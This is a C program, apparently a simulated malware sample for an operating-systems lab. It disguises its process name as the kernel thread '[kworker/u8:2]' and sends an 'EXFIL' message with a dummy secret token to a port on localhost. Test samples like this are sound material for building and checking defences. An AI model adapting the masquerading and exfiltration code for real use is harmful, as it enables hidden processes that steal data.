#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <unistd.h>

static int attempt_exfil(int port, const char *comm, const char *exe_path) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    char msg[256];
    int n = snprintf(
        msg,
        sizeof(msg),
        "EXFIL pid=%d comm=%s exe=%s secret=OS_FALL2026_MEMFD_TOKEN\n",
        getpid(),
        comm,
        exe_path
    );
    ssize_t sent = send(sock, msg, (size_t)n, 0);
    close(sock);
    return (sent > 0) ? (int)sent : -1;
}

int main(int argc, char *argv[]) {
    const char *fake_name = "[kworker/u8:2]";
    int masquerade = 1;
    int ticks = 8;
    int exfil_port = 0;
    int exfil_delay_ms = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-masquerade") == 0) {
            masquerade = 0;
        } else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) {
            fake_name = argv[++i];
        } else if (strcmp(argv[i], "--ticks") == 0 && i + 1 < argc) {
            ticks = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--exfil-port") == 0 && i + 1 < argc) {
            exfil_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--exfil-delay-ms") == 0 && i + 1 < argc) {
            exfil_delay_ms = atoi(argv[++i]);
        }
    }

    if (masquerade) {
        prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);
    }

    char exe_path[256] = {0};
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len < 0) {
        snprintf(exe_path, sizeof(exe_path), "unknown");
    }

    char comm[32] = {0};
    prctl(PR_GET_NAME, (unsigned long)comm, 0, 0, 0);

    if (exfil_port > 0) {
        if (exfil_delay_ms > 0) {
            usleep((useconds_t)exfil_delay_ms * 1000);
        }
        int sent = attempt_exfil(exfil_port, comm, exe_path);
        if (sent > 0) {
            printf("[payload] exfiltrated %d bytes to 127.0.0.1:%d (pid=%d)\n", sent, exfil_port, getpid());
            fflush(stdout);
        }
    }

    printf("[payload] pid=%d ppid=%d comm=%s exe=%s\n",
           getpid(), getppid(), comm, exe_path);
    fflush(stdout);

    for (int i = 1; i <= ticks; i++) {
        printf("[payload] heartbeat %d/%d (pid=%d)\n", i, ticks, getpid());
        fflush(stdout);
        usleep(500000);
    }

    printf("[payload] completed without interception\n");
    return 0;
}
